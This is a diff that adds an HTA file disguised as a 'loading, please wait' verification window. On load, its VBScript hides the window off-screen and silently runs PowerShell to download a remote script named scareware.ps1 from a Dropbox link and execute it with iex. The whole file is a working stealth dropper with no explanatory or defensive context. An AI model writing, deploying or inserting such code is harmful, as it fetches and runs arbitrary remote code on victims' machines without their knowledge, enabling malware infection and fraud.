@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>loading, please wait</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="verification window"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+        SCROLL="no"
+        SCROLLFLAT="yes"
+        SYSMENU="yes"
+    />
+    <script language="VBScript">
+    Sub Window_onLoad
+        Window.ResizeTo 1, 1
+        Window.MoveTo -32000, -32000
+        
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell irm 'https://www.dropbox.com/scl/fi/90rlzyk3nmspdoiu0d67z/scareware.ps1?rlkey=8zmvfivvcq3dz1bvril53gyxm&st=uaou375l&dl=1' | iex", 0, False
+    End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
